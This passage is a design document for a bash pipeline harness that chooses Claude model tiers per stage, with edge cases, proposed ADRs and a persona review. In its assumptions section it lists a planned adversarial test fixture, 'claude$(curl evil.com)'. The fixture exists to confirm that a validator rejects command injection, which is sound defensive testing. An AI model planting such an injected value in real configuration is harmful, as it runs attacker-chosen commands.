`|`, backtick, `<>`). On regex fail the helper falls through to the
next precedence layer (escalation → default) with one `log` warning.
Same fail-soft posture as `_dispatch_tools_from_profile` at
`bin/dispatch.sh:290-373`.

### Linear API outage (escalation predicate)

`_count_loopback_rejections_for_stage` reads `bash bin/linear.sh
get-comments "$ident"`. On Linear API outage `get-comments` exits
non-zero; the helper catches with `|| true`, returns 0 (no escalation).
Soft-fail to the cheap tier on Linear outage is the LESS-RISKY default:

- If we soft-fail to Opus (the expensive tier), a Linear outage burns
  Opus rates on every implement dispatch until the outage clears —
  exactly the cost mode this ticket is fixing.
- If we soft-fail to Sonnet, the worst case is one extra cheap-tier
  retry on an already-broken issue, which Linear-back-online resolves
  on the next tick (the count comes back correct, escalation fires).

Same fail-open shape as `_entry_conditions_gate` on Linear/gh outage
(`bin/run-stage.sh:735-736`).

### `dispatch.sh` invoked directly (test path, mutex-test)

`bin/dispatch-test.sh` and `bin/mutex-test.sh` invoke `dispatch.sh`
without going through `run-stage.sh`. Pre-ENG-103, the dispatch path
worked with `PIPELINE_DISPATCH_MODEL` unset; the `[[ -n ... ]] &&
cmd+=(...)` form preserves this — no `--model` token in the argv →
claude uses the subscription default → test fixtures (which use
`PIPELINE_DRY_RUN=1`) see no `--model` token in the dry-run log.
Existing fixtures stay green. The ONE new dispatch-test.sh fixture
(D-006) explicitly sets the env var to test the positive case.

### Empty escalation override (model name not in default table)

If a stage is missing from the D-001 default table (e.g., `released`,
or a hypothetical future stage), `_resolve_dispatch_model` returns
empty. `run-stage.sh` exports `PIPELINE_DISPATCH_MODEL=""` to
dispatch.sh; dispatch.sh's `[[ -n ... ]]` test skips the `--model`
append; claude uses subscription default. Same as today's behavior.

### Resolved model rejected by claude (e.g., subscription doesn't have access)

`claude -p --model claude-opus-4-7 ...` on an account without Opus
access returns a clear error in the stream and exits non-zero. The
existing `dispatch_rc != 0` branch in run-stage.sh handles this:
`classify_failure` records the failure, `retry-immediately` policy
fires, next tick re-dispatches. The operator sees the claude-side
error message in `$log_file` and adjusts their config. Same path as
any other claude-side rejection.

The `usage-<stage>.json::model` field continues to record the model
claude ACTUALLY used (or empty on a hard reject), per ENG-26's
existing extraction at `bin/dispatch.sh:96`. The audit reflects
reality, not the orchestrator's request.

### Race condition: comment posted mid-dispatch

A `verdict result=fail target=implementing` comment posted by some
OTHER actor between `_resolve_dispatch_model` and the actual dispatch
invocation cannot change the resolved model: it's already captured in
`PIPELINE_DISPATCH_MODEL`. Worst case: one extra cheap dispatch on an
issue where escalation SHOULD have fired but the marker landed too
late. Next tick picks it up. Acceptable — this is the same staleness
shape every Linear-driven decision in the harness has (poll.sh
classification, find_fresh_verdict, etc.).

## 6. Edge cases

1. **First-ever dispatch on a new issue.** Count = 0, no transitions
   exist yet, no fail markers exist. `_resolve` returns the D-001
   default for the stage. Expected.

2. **Operator pins a stage to a specific model via config.** D-001
   precedence layer 1 wins over escalation override; the operator owns
   the trade-off. Test fixture #13.

3. **Operator pins a stage to an empty string in config.** `jq -r
   '.dispatch.model[<stage>] // empty'` returns empty; treated as
   "config did not set anything" and the escalation+default path runs.
   This matches the existing `dispatch.tools[<stage>] // []` shape at
   `bin/dispatch.sh:261`.

4. **Issue has many transition events; the most recent `to=<stage>`
   transition is days old, with many newer fail markers.** Count
   includes all of them. Predicate fires on count ≥ 1. Acceptable —
   once the issue has loopback history at the current stage, the cheap
   tier has demonstrably been insufficient on THIS issue. Stay
   escalated.

5. **Issue with no `to=<stage>` transition at all (initial
   dispatch).** `_count_loopback_rejections_for_stage` falls back to
   "no transition timestamp" → counts ALL fail markers on the issue.
   This is conservative (slightly over-escalates on issues with prior
   reject history before any forward progress); matches the existing
   `count_marker_since_last_transition` behavior at `bin/guards.sh:58-62`.
   Acceptable cost: an extra Opus pass on a brand-new issue's
   implement is sub-$5 worst case.

6. **`claude-opus-4-7[1m]` (1M-context bracket form) in operator
   config.** The validator regex `^[A-Za-z0-9._\[\]:-]+$` permits the
   bracketed form (square brackets escaped in the character class).
   Test fixture #12 asserts the bracketed form passes through to the
   argv.

7. **Stage drift mid-dispatch.** If the stage label drifts between
   `_resolve_dispatch_model` and the post-dispatch label re-check
   (`bin/run-stage.sh:1502` already handles this), the resolved model
   is for the DISPATCHED stage, not the current label. This is
   correct: the agent did the work for the stage we dispatched; the
   model field records that.

8. **The harness driving itself (TARGET_REPO=harness).** All eight
   stages dispatch normally. Default table applies. Operator who wants
   different tiering on the harness self-target writes
   `dispatch.model[<stage>]` in the harness's gitignored
   `.pipeline-config/config.json::dispatch.model`. The mechanism is
   uniform.

9. **Retrospective stage.** Skipped per D-005. No `--model` flag,
   subscription default. CLAUDE.md retrospective-lifecycle section
   continues to apply unchanged.

10. **A future stage adds escalation needs (e.g., `qa` escalation on
    prior `verdict fail target=qa` markers).** `qa` is not in the
    `fail_targets` registry today (`bin/pipeline-events.json:25-30`
    lists only brainstorming, planning, implementing, ui). Adding
    qa-escalation would require both a registry entry AND a helper
    extension. Out of scope per Linear "Out of scope" §3.

11. **`PIPELINE_DISPATCH_MODEL` set by an operator manually for a
    one-off dispatch.** `run-stage.sh` overwrites it each tick via the
    env-export at dispatch invocation, so operator-set values don't
    leak between ticks. Matches existing `PIPELINE_ISSUE_ID` /
    `PIPELINE_DISPATCH_ID` semantics.

12. **Same-issue concurrent dispatch (ENG-81 K=2).** Per CLAUDE.md
    "Per-issue `.in-flight.lock` prevents same-issue double-dispatch",
    so within an issue there's no race on the resolution. Across
    issues, each tick's run-stage call resolves independently.

13. **Dry-run path.** `PIPELINE_DRY_RUN=1` → dispatch.sh logs the
    would-invoke line with `--model "$PIPELINE_DISPATCH_MODEL"`
    included. Test fixture asserts this. No claude invocation.

14. **Build P6 rebase loopback specifically.** The build agent posts
    `<!-- meta: metric name=merge_conflict -->` AND `<!-- pipeline:
    verdict result=fail target=implementing -->` per
    `AGENT_PROMPTS.md:1402-1406`. The next tick's implementing
    dispatch's `_resolve` sees count=1, escalates to Opus. The Opus
    implement-iter handles the rebase per the prompt's §3 rebase
    instructions (`AGENT_PROMPTS.md:629-636`). One Opus pass costs
    ~$1 vs the Sonnet+rebase-fail cycle at ~$0.30 × 2 = $0.60; the
    escalation pays for itself when it prevents a third loop.

## 7. Open Questions

1. **OQ-1. Should the default for `brainstorming` / `planning` /
   `reviewing` be `claude-opus-4-7` or `claude-opus-4-7[1m]`?**
   The 1M-context flag adds cost (cache savings notwithstanding); the
   reasoning load on persona-review iterations may not require it.
   Current observed dispatches under the subscription default appear
   to record `claude-opus-4-7[1m]` per `bin/metrics-test.sh:73`
   fixture, but that fixture is illustrative, not authoritative.
   Conservative answer: ship with unbracketed `claude-opus-4-7`
   default; operators add `[1m]` via config if they observe context
   pressure. Revisit if telemetry shows persona-iter-2 brainstorms
   over-contextualizing under non-1M. Not blocking.

2. **OQ-2. Should escalation persist across forward transitions within
   a single issue?** Current design resets on the most-recent
   `to=<stage>` transition. If implement-iter-1 fails review,
   escalates implement-iter-2 to Opus, succeeds, transitions to ui —
   and ui-iter-1 fails review and loops back to implement — does
   implement-iter-3 start cheap (count gated since the most recent
   `to=implementing` transition, which is the just-occurred loopback)
   or remain escalated (the issue has shown cheap-tier weakness once)?
   Current design: cheap. Alternative: "once escalated for the issue,
   stay escalated" via a sticky issue-state flag. Conservative answer:
   keep the simpler reset-on-transition semantics (matches existing
   rejection-counter shape in `guards.sh::count_marker_since_last_transition`);
   the cost difference is one Sonnet pass per fresh loopback chain.
   Not blocking.

3. **OQ-3. Should the default table be in `dispatch.sh` (consumed by
   `run-stage.sh::_resolve_dispatch_model` via `bash dispatch.sh
   default-model "<stage>"`) or in `run-stage.sh` directly?**
   Current design: in `run-stage.sh` next to `_resolve_dispatch_model`.
   Argument for `dispatch.sh`: symmetry with `allowed_tools_for`'s
   per-stage case statement living in dispatch.sh. Argument for
   `run-stage.sh`: model resolution requires the escalation predicate
   (which reads Linear) — keeping the whole resolver in one file
   reduces the cross-file dependency. Vote: run-stage.sh, for the
   resolver-locality reason. Not blocking.

4. **OQ-4. Should the `model_escalation` config key from the Linear
   issue's "Mechanism §1" example schema be implemented?**
   The example shows:
   ```json
   "model_escalation": {
     "implementing": "claude-opus-4-7",
     "ui":           "claude-opus-4-7"
   }
   ```
   Today the brainstorm hardcodes the escalation target to
   `claude-opus-4-7`. A `model_escalation[<stage>]` config would let
   operators override the escalation tier (e.g., to
   `claude-opus-4-7[1m]` for harder issues). Current design: defer to
   a follow-up. Adding the key is one jq extraction; adding the test
   coverage is two more fixtures. Trade-off: complete config surface
   vs minimum-scope ship. Vote: defer; the Linear issue's "Out of
   scope" §3 lists "Per-target model overrides" as out of scope, and
   the `model_escalation` knob is the per-stage escalation analog of
   the same thing. Not blocking for ENG-103.

5. **OQ-5. Should we add a guard rejecting an `implementing` / `ui`
   dispatch where the loopback-rejection count is ≥ N (some threshold
   higher than escalation, signaling "even Opus retried N times, this
   issue needs human review")?**
   This is the `implement_rejection` halt-threshold shape that
   `guards.sh` already implements (default threshold 2 per
   `bin/guards.sh:86`); they share the marker family. Today the halt
   threshold fires AFTER escalation has happened: cheap-tier pass 1,
   Opus-tier pass 2 (escalated), then `guards.sh check` trips at count
   = 2 and halts for human. So the existing guard already addresses
   this — no new threshold needed. Verified at
   `bin/run-stage-test.sh:1523-1600` (Case 15).

## 8. ADR stress test

This brainstorm interacts with four existing decisions:

- **ENG-26 (six-field usage-<stage>.json schema with `model`
  field):** D-004 leans on the existing `model` field as the
  authoritative per-dispatch record of what claude ACTUALLY billed
  against. No schema change. Net pressure on ENG-26: zero.

- **ENG-48 / ENG-65 (gtimeout watchdog + per-stage timeout
  resolution):** D-003's `_resolve_dispatch_model` mirrors the ENG-65
  `_cfg_minutes` resolution chain at `bin/dispatch.sh:469-488`
  exactly. The two resolvers compose: a brainstorm dispatch at Opus
  with 60-min cap runs as before; a building dispatch at Haiku with
  30-min cap also runs as before. No coupling between model tier and
  timeout duration. Net pressure on ENG-48/ENG-65: zero.

- **ENG-81 (per-project dispatch concurrency, K=2 default):** the
  Claude counting semaphore is per-`HARNESS_STATE_DIR`, model-agnostic.
  Two concurrent dispatches at different tiers (one Opus brainstorming,
  one Sonnet implementing) occupy two slots normally. Net pressure on
  ENG-81: zero.

- **ENG-101 (defensive-code restraint clause):** ENG-103 is EXPLICITLY
  blocked by ENG-101 per the Linear issue's "Blocked by" §. ENG-101's
  prompt-side restraint clause makes Sonnet's defensive-code training
  pull no longer the dominant failure mode on implementing. Until
  ENG-101 ships, the D-001 implementing-default cutover MUST NOT flip
  Sonnet (per D-008). Implementation ordering: plan-level dependency
  recorded; code-level edits land independently.

- **ENG-86 (orchestrator entry-conditions):** D-005 keeps `building`
  agent post-ENG-86 a near-empty dispatch (P2 runs in bash pre-dispatch
  via `_entry_conditions_gate`). The agent body is `gh pr merge --auto
  --delete-branch` + waypoint comment. Haiku 4.5 is sized exactly for
  this work. Net pressure on ENG-86: zero; rather, ENG-86's reduction
  of build's cognitive load is what makes Haiku-tier viable.

No existing ADR is overturned. ENG-101 is named as the precondition
for the implementing-default tier cut-over.

## 9. Assumption inventory

Format: `[verified|assumed]` ITEM — `path:line` reference (or "needs
to be created" for assumed items).

### Verified — code paths quoted from the current tree

- `[verified]` `dispatch.sh` invokes `claude -p` with NO `--model`
  flag — `bin/dispatch.sh:561-568`. The flag-insertion site is between
  `--output-format stream-json --verbose` and `--setting-sources
  project,local`.
- `[verified]` `allowed_tools_for` is the per-stage case-statement
  precedent for per-stage knobs in dispatch.sh —
  `bin/dispatch.sh:375-422`.
- `[verified]` `_cfg_minutes` resolution mirrors the proposed
  per-stage model resolution (CONFIG → global → built-in default) —
  `bin/dispatch.sh:469-488`. Same `jq -r --arg s "$stage" '...[$s] //
  empty' "$CONFIG" 2>/dev/null` shape; same `[[ -n "$_cfg" =~ pattern
  ]]` validation.
- `[verified]` `_cost_flags_for` plumbs `--model <name>` into every
  `metrics.sh stage-end` row — `bin/run-stage.sh:87-95`. The
  newline-delimited contract preserves the literal model string
  across the function boundary verbatim (the model literal contains
  glob chars like `[1m]`).
- `[verified]` `_render_and_capture_stream` writes `model` to
  `usage-<stage>.json` from the `result` event's `modelUsage` keys —
  `bin/dispatch.sh:96`. The init-event `.model` field is the fallback
  for partial captures — `bin/dispatch.sh:115`.
- `[verified]` Stage names use canonical gerund form —
  `bin/pipeline-events.json:51-60` (`brainstorming, planning,
  implementing, ui, reviewing, qa, building, released`).
- `[verified]` `fail_targets` vocabulary registers exactly
  `brainstorming, planning, implementing, ui` —
  `bin/pipeline-events.json:25-30`. Escalation predicate's per-stage
  scope (D-002) is bounded to these four.
- `[verified]` Loopback transition table includes `building →
  implementing`, `reviewing → implementing`, `qa → implementing`,
  `reviewing → brainstorming`, `planning → brainstorming` —
  `bin/verdict-handler.sh:32-38`. The verdict-fail target maps to the
  loopback table.
- `[verified]` `count_marker_since_last_transition` is the existing
  pattern for "count marker comments newer than the latest transition
  comment" — `bin/guards.sh:51-70`. Uses `<!-- pipeline: transition ...
  -->` (and legacy `<!-- pipeline-transition: ... -->`) as the
  timestamp anchor.
- `[verified]` `bin/linear.sh get-comments <issue>` returns the
  comment array as JSON — invoked by both
  `count_marker_since_last_transition` (`bin/guards.sh:54`) and
  `find_fresh_verdict` (`bin/verdict-handler.sh:159`). Soft-fail empty
  / null is the existing handling shape.
- `[verified]` `_pre_dispatch_merge_gate` (build-only) returns 0 when
  PR is MERGED; non-zero (return 1) otherwise — `bin/run-stage.sh:644-685`.
- `[verified]` Test sentinel pattern enables test-time sourcing —
  `bin/dispatch.sh:623-625` (`if [[ "${BASH_SOURCE[0]}" == "${0}" ]];
  then main "$@"; fi`). CLAUDE.md "How tests work" §.
- `[verified]` Existing `dispatch_timeout_minutes_per_stage` test
  fixtures in `bin/dispatch-test.sh` Group 5 lines ~296-322. The new
  `--model` fixture slots into the same group.
- `[verified]` `AGENT_PROMPTS.md` §3 (Implement Agent) rebase-loopback
  context references `<!-- meta: metric name=merge_conflict -->` and
  tracks the `building → implementing` transition shape —
  `AGENT_PROMPTS.md:629-636`. The build P6 emission shape:
  `AGENT_PROMPTS.md:1402-1406`. The escalation predicate maps to the
  upstream `verdict fail target=implementing` marker the build agent
  posts before the loopback.
- `[verified]` `PIPELINE_DISPATCH_ID` env-var contract between
  run-stage.sh and dispatch.sh — `bin/dispatch.sh:543-557`,
  `bin/run-stage.sh:1066-1075`. The `PIPELINE_DISPATCH_MODEL` proposal
  uses the same hand-off shape.
- `[verified]` CLAUDE.md "Per-stage dispatch timeouts (ENG-65)"
  section is the operator-doc precedent for per-stage knobs in
  `.pipeline-config/config.json`. Same surface, symmetric structure
  for the new `dispatch.model[<stage>]` knob.
- `[verified]` `docs/knowledge/decisions.md` is absent in the current
  tree (per `ls docs/knowledge/` showing only `architecture.md,
  assumptions.md, configuration.md, cost.md, install.md, operations.md,
  pipeline-vocabulary.md, pipeline-vocabulary.template.md, plans,
  runbooks, security.md`). Per the CLAUDE.md brainstorm prompt
  preamble, decisions.md is "skip if not present"; the proposed ADRs
  live in §10 of this brainstorm.
- `[verified]` `bin/dispatch.sh:511-517` is the DRY_RUN log line
  where the would-invoke argv is emitted. The new `--model` token
  appears in this log for the dispatch-test.sh fixture (D-006).
- `[verified]` ENG-101 has NOT shipped (no `defensive-code restraint`
  / ENG-101 clause found in `AGENT_PROMPTS.md` via `grep -nE
  'ENG-101|defensive' AGENT_PROMPTS.md`). The Linear issue's "Blocked
  by" § preserves this; D-008 codifies the cut-over ordering.
- `[verified]` `parse_pipeline_marker` is the canonical body-to-event
  parser callable from any helper sourcing `common.sh` — used by
  `find_fresh_verdict` at `bin/verdict-handler.sh:181-184` and by
  `common-test.sh:259`. New helper
  `_count_loopback_rejections_for_stage` uses the same shape (not raw
  substring matching) to avoid the ENG-87 D-3 prose-quoted-marker
  hazard.
- `[verified]` `bin/metrics.sh:7,25,34,66-73` accepts the `--model
  <name>` flag. The model field passes through verbatim into
  `events.jsonl` rows (no transformation).
- `[verified]` `bin/pipeline.sh:118-122` writes verdict markers in
  the shape `<!-- pipeline: verdict result=<r> [stage=<s>]
  [target=<t>] [reason=<r>] -->`. This is the canonical written form
  the escalation predicate's parser reads.

### Assumed — needs verification or new code

- `[assumed]` `claude -p --model claude-sonnet-4-6` is a valid
  invocation form (the headless `-p` mode accepts a `--model` flag).
  The Claude Code CLI documents `--model` per the standard claude.ai
  CLI reference. **TODO:** before shipping, confirm `claude -p --model
  claude-sonnet-4-6 --help` doesn't error out under the operator's
  subscription session. Worst case: the flag is silently ignored and
  the subscription default applies — telemetry catches this via
  `usage-<stage>.json::model` (would NOT show the requested model).
- `[assumed]` `claude-haiku-4-5-20251001` exists at the time of ship.
  Anthropic's release calendar can shift the date suffix. **TODO:**
  before merging the plan, confirm the exact identifier via the
  current model list. If the date suffix differs, update the D-001
  table.
- `[assumed]` Sonnet 4.6 (`claude-sonnet-4-6`) passes the
  implement-stage agent contracts post-ENG-101 with no observed
  defensive-code drift. The Linear issue's "Blocked by" § asserts
  this; **post-merge spot-check (D-008):** measure scope-violation
  rate on `implementing` stage events with model=sonnet vs model=opus
  over the first 20 dispatches; if Sonnet's scope-violation rate is ≥
  2× Opus's, revert the implementing default to Opus and re-open
  ENG-101's restraint clause.
- `[assumed]` Haiku 4.5 is sufficient for `gh pr merge --auto
  --delete-branch` + a 2-3 sentence waypoint comment. Build agent's
  prompt body (`AGENT_PROMPTS.md` §7) is the canonical contract;
  Haiku's pattern-matching tier should handle the templated work.
  **Post-merge spot-check:** confirm build-stage protocol-violation
  rate on Haiku stays ≤ 5% (compare to current Opus baseline). If
  Haiku produces malformed waypoint comments or skips the `gh pr
  merge` invocation, fall back to Sonnet.
- `[assumed]` The model-name regex `[[ "$resolved" =~
  ^[A-Za-z0-9._\[\]:-]+$ ]]` permits all currently-shipping claude
  model identifiers (including bracketed `[1m]` and date-suffixed
  `4-5-20251001` forms). **TODO during implement:** dry-run the regex
  against the full D-001 table in `bin/run-stage-model-test.sh` and
  include fixture #16 (adversarial `claude$(curl evil.com)` payload)
  to confirm rejection.
- `[assumed]` `_count_loopback_rejections_for_stage` projects each
  comment body via `parse_pipeline_marker` rather than raw substring
  matching, to handle the ENG-87 prose-quoted-marker hazard
  (`bin/verdict-handler.sh:174-188`'s D-3 sanitization concern).
  **TODO during implement:** confirm `parse_pipeline_marker` filters
  out HTML-comment-escaped markers (per ENG-87 D-3) and code-fenced
  markers (per `_strip_code_blocks_and_spans`). Both already work for
  `find_fresh_verdict`; the same projection is correct for this
  helper.
- `[assumed]` `PIPELINE_DISPATCH_MODEL` is not currently used by any
  script in `bin/`. **Verified by inspection:** `grep -nr
  PIPELINE_DISPATCH_MODEL bin/` returns nothing. Safe to claim the
  name.
- `[assumed]` Adding `--model` to `claude -p` does NOT interact badly
  with `--setting-sources project,local`, `--disable-slash-commands`,
  or `--disallowed-tools`. These flags are orthogonal in the CLI's
  flag-parser. **TODO:** smoke-test a single dry-run dispatch on each
  stage post-merge to confirm.

## 10. Proposed ADRs

Filed inline here because `docs/knowledge/decisions.md` does not exist
in this repo (per the brainstorm prompt's "skip if not present"
clause).

### ADR-001 (proposed): Per-stage model tiering via `PIPELINE_DISPATCH_MODEL` env var

**Status:** proposed
**Date:** 2026-05-15
**Context:** All eight stages currently run on the operator's
subscription default (Opus 4.7). The cost surface is uniform; the
cognitive-load surface is not. ENG-26 telemetry already records
per-dispatch model; the lever to set it is missing.
**Decision:** Add a per-stage built-in default model table in
`bin/run-stage.sh::_resolve_dispatch_model`, with operator-config
override via `.pipeline-config/config.json::dispatch.model[<stage>]`
and an escalation override for `implementing` / `ui` on prior
loopback-rejection count ≥ 1. Resolved model is exported as
`PIPELINE_DISPATCH_MODEL` env var consumed by `bin/dispatch.sh` which
splices `--model "$val"` into the `claude -p` argv when set.
**Consequences:**
- Cost: target ≥ 50% drop on implement-stage spend, ≥ 70% on build.
- Risk: Sonnet 4.6 quality regression on implement; mitigated by
  ENG-101 (defensive-code restraint clause) being a hard precondition
  via D-008 and by the escalation override that retries on Opus
  after one failed cheap-tier loop.
- Operator surface: one config knob (`dispatch.model[<stage>]`), one
  CLAUDE.md subsection mirroring ENG-65's per-stage timeout doc.
**Alternatives rejected:** Pure-config (no built-in defaults) — every
operator hand-rolls the same block. Per-target profile-driven model —
profile drives stack, not cognitive-load tier; orthogonal.

### ADR-002 (proposed): Escalation predicate is loopback verdict count, not rebase metric

**Status:** proposed
**Date:** 2026-05-15
**Context:** The Linear issue named two escalation triggers (rebase,
review-loopback iter ≥ 2) but the Mechanism §4 collapsed them to a
single signal: prior `verdict fail target=<stage>` marker count since
the most recent transition. Both rebase (build→implement loopback)
and review-loopback emit this marker.
**Decision:** The escalation predicate is `count >= 1` of `<!-- pipeline:
verdict result=fail target=<stage> -->` markers newer than the most
recent `<!-- pipeline: transition ... to=<stage> -->`. No separate
rebase-counter, no separate review-iter counter. Threshold = 1 because
each retry pays full dispatch cost; one failed cheap iteration is
enough evidence.
**Consequences:**
- Unified signal source; no second source of truth.
- Reuses existing marker family (no vocabulary registry change).
- One extra Opus pass on issues that would have succeeded on a second
  Sonnet pass; bounded by the existing `implement_rejection`
  halt-threshold (default 2 per `bin/guards.sh:86`).
**Alternatives rejected:** Per-trigger predicates (rebase counter +
review-iter counter) — splits the signal source and complicates the
resolver. Threshold = 2 — wastes one extra cheap-loop dispatch per
chain.

## 11. Persona review

Personas applied in the mandated order:
design → security → scope → coherence → product → feasibility
(gating).

### Iteration 1

#### design — PASS

D-001 (default table + config + env-var hand-off), D-002 (escalation
predicate), D-003 (run-stage→dispatch.sh hand-off mechanism), D-004
(observability), D-005 (scope fence), D-006 (test surface), D-007
(operator-doc), D-008 (ENG-101 ordering) compose cleanly: D-001 is
the "what tier" decision, D-002 is the "when to override the tier"
decision, D-003 is the "how the orchestrator tells dispatch.sh"
decision; D-004 and D-007 are observability and docs; D-005, D-006,
and D-008 fence, verify, and order.

The env-var hand-off (`PIPELINE_DISPATCH_MODEL`) mirrors the existing
`PIPELINE_DISPATCH_ID` and `PIPELINE_STAGE` patterns at
`bin/dispatch.sh:543-557` and `bin/run-stage.sh:1066-1075`.
Resolution precedence mirrors the ENG-65 `_cfg_minutes` chain at
`bin/dispatch.sh:469-488`. No new abstractions, no new modules.

D-002's unified verdict-target-count signal subsumes both named
triggers (rebase, review-loopback) without splitting the predicate
into a multi-source resolver.

No P0 / P1. One P2: D-006's fixture #14 ("malformed config: integer")
description disambiguates the type-mismatch case via fixture wording
("jq integer 60, not string"). Acceptable.

#### security — PASS

No new auth surface. The proposed `${PIPELINE_DISPATCH_MODEL:-}`
parameter-expansion form is ENG-46-compliant: the variable name does
NOT match any of `*KEY|*TOKEN|*SECRET|ANTHROPIC*|GITHUB*|LINEAR*`,
matching the existing `PIPELINE_DISPATCH_ID` and `PIPELINE_STAGE`
shapes already lint-clean. The model regex `[[ "$resolved" =~
^[A-Za-z0-9._\[\]:-]+$ ]]` rejects shell-meta-bearing payloads (`,`,
`;`, `&`, `|`, backtick, `$(`) preventing argv injection through a
malicious config. Fixture #16 anchors this rejection behavior.

`_count_loopback_rejections_for_stage` reads Linear comments via the
existing `bash bin/linear.sh get-comments` chokepoint; no new
external surface. Body projection via `parse_pipeline_marker` (not
raw substring) inherits the ENG-87 D-3 sanitization defenses against
prose-quoted markers.

The `--model` flag landing in the dry-run log line (the would-invoke
echo) is non-sensitive: model names are public CLI flags.

No P0 / P1 / P2 findings.

#### scope — PASS

The brainstorm addresses the seven ACs from the Linear issue's
"Mechanism" §:

- Mechanism §1 (config schema with `dispatch.model[<stage>]` and
  `model_escalation`): D-001 implements `dispatch.model[<stage>]`;
  `model_escalation` deferred per OQ-4 with rationale.
- Mechanism §2 (run-stage.sh resolves the model id): D-003.
- Mechanism §3 (built-in default table matches issue's table): D-001.
- Mechanism §4 (escalation fires on ≥ 1 prior fail target=<stage>):
  D-002.
- Mechanism §5 (ENG-26 telemetry captures model; spot-check
  post-ship): D-004.
- Mechanism §6 (missing config → built-in defaults; no die): D-001
  precedence layer 3.
- Mechanism §7 (pre-commit suite passes): D-006 (new
  `bin/run-stage-model-test.sh` and `bin/dispatch-test.sh` fixture).

Plus the issue's "Blocked by" relationship is encoded as D-008.

Nothing implemented beyond AC scope:

- Per-target overrides: explicitly deferred per OQ-4; built-in
  defaults are the floor; `dispatch.model[<stage>]` in the target's
  config.json is the per-target override mechanism (no new code).
- Retrospective agent tiering: explicitly out of scope per D-005 and
  Linear "Out of scope" §3.
- ENG-38 qa split: out of scope; the qa default (`claude-sonnet-4-6`)
  accommodates the future split when it ships.
- Additional escalation triggers (failed-test count, scope-check halt
  count): out of scope per Linear "Out of scope" §3; "filed as
  follow-up if the simple signal proves insufficient" per Linear's
  own wording.
- `released` stage tier change: explicitly out of scope per D-005;
  Linear defaults table omits it.

No P0 / P1 / P2 findings.

#### coherence — PASS (with one P2 note)

Internal consistency check:

- D-002's predicate reads the same marker family
  (`<!-- pipeline: verdict result=fail target=<stage> -->`) that
  `verdict-handler.sh::find_fresh_verdict` writes via
  `bin/verdict-handler.sh:243`. Single source of truth.
- D-003's env-var contract matches the existing `PIPELINE_DISPATCH_ID`
  shape exactly. No new hand-off pattern.
- D-001's built-in default table is consumed in one place
  (`_resolve_dispatch_model` in `run-stage.sh`); dispatch.sh's splice
  is shape-only (env-var presence test). No duplication.

Vocabulary check: `fail_targets:
["brainstorming","planning","implementing","ui"]`
(`bin/pipeline-events.json:25-30`) is the registry that the escalation
predicate scopes against. No new vocabulary needed.

Lane check (per CLAUDE.md "Label vocabulary"): the orchestrator runs
`_resolve_dispatch_model` (lane=`orchestrator`, default). dispatch.sh
sets `PIPELINE_WRITER=agent` for the claude subshell at line 554
(`local cmd=(env PIPELINE_WRITER=agent ...)`), so agent-side Linear
writes are correctly lane-attributed. Adding `PIPELINE_DISPATCH_MODEL`
to this env block does not change lane semantics — the resolver runs
BEFORE the env block.

One P2: D-006's fixture for `bin/dispatch-test.sh` (the dry-run splice
assertion) is in Group 5. The existing Group 5 is the
`dispatch_timeout_minutes` test cluster. Group 5 might grow to include
both timeout and model fixtures, or a new Group 7 could be opened.
Style-only. Either is acceptable; keeping it in Group 5 (per-stage
knobs) is the better fit.

#### product — PASS

Operator workflow audit:

1. **Today (pre-ENG-103):** every dispatch on the operator's account
   runs Opus 4.7. The implement stage on an issue with 3 loopback
   retries pays 3 × Opus = ~$3 in spend per loopback chain. The build
   stage pays Opus for a 5-line waypoint comment + a `gh pr merge`
   invocation.
2. **After ENG-103 (post-ENG-101):** implement-iter-1 runs Sonnet
   (~$0.30); if a review fail loops it back, implement-iter-2 runs Opus
   (~$1) because count = 1. Build pays Haiku ~$0.05. Net: a 2-loop
   implement chain drops from $2 to $1.30 (35% reduction); a 1-loop
   pure-success chain drops from $1 to $0.30 (70% reduction). Build
   drops 95%.
3. The escalation path means operators retain the Opus reliability
   when it matters; the cost-reduction is at the cheap tier where the
   work is genuinely lighter.

The CLAUDE.md doc edit (D-007) is the operator-facing surface; an
operator can opt out of the default (e.g., pin implement to Opus
permanently) via one config line.

No regressions for the happy path: a brainstorm with 6/6 PASS in iter
1 runs Opus, same as today.

No P0 / P1 / P2 findings.

#### feasibility (gating) — PASS

Codebase-fact verification re-run against the current tree (every
`path:line` in §3 Architecture and §9 Assumption Inventory was opened
and quoted during draft):

- `bin/dispatch.sh:561-568` — claude argv composition, NO --model
  today ✓
- `bin/dispatch.sh:375-422` — `allowed_tools_for` per-stage case
  statement ✓
- `bin/dispatch.sh:469-488` — `_cfg_minutes` resolution chain
  (precedent for proposed `_resolve_dispatch_model`) ✓
- `bin/dispatch.sh:96` — `model: (.modelUsage // {}) | keys | .[0]`
  → usage-stage.json::model ✓
- `bin/dispatch.sh:115` — init-event `.model` field ✓
- `bin/dispatch.sh:511-517` — DRY_RUN log line where new --model
  fixture asserts ✓
- `bin/dispatch.sh:543-557` — PIPELINE_DISPATCH_ID env hand-off shape
  (precedent for PIPELINE_DISPATCH_MODEL) ✓
- `bin/dispatch.sh:623-625` — test sentinel ✓
- `bin/run-stage.sh:69-95` — cost-telemetry helpers block,
  `_cost_flags_for` plumbs --model ✓
- `bin/run-stage.sh:87-95` — `_cost_flags_for` newline-delimited flag
  output, model preserved verbatim ✓
- `bin/run-stage.sh:1066-1075` — env-export site (PIPELINE_STAGE,
  PIPELINE_DISPATCH_ID); the new PIPELINE_DISPATCH_MODEL slots in ✓
- `bin/run-stage.sh:1156-1162` — dispatch.sh invocation site (where
  PIPELINE_DISPATCH_MODEL gets exported) ✓
- `bin/pipeline-events.json:25-30` — `fail_targets` registry ✓
- `bin/pipeline-events.json:51-60` — `stages` registry (gerund
  form) ✓
- `bin/verdict-handler.sh:32-38` — loopback transition table ✓
- `bin/verdict-handler.sh:181-184` — verdict-marker parse shape
  (parse_pipeline_marker → event=verdict result=fail target=<stage>) ✓
- `bin/verdict-handler.sh:243` — `pipeline-rejection` shape output ✓
- `bin/guards.sh:51-70` — `count_marker_since_last_transition`
  pattern ✓
- `bin/guards.sh:86` — implement_rejection threshold default ✓
- `bin/metrics.sh:7,25,34,66-73` — --model flag plumbed through
  metrics ✓
- `bin/pipeline.sh:118-122` — verdict marker write shape ✓
- `AGENT_PROMPTS.md:629-636` — rebase-loopback context (the source of
  the `merge_conflict` metric the issue named, subsumed by the
  unified verdict-target signal) ✓
- `AGENT_PROMPTS.md:1402-1406` — build P6 emission of `merge_conflict`
  + verdict fail target=implementing ✓
- `bin/run-stage-test.sh:1523-1600` — guards.sh check Case 15
  (related but orthogonal threshold-test pattern) ✓
- `bin/metrics-test.sh:73` — fixture using model literal
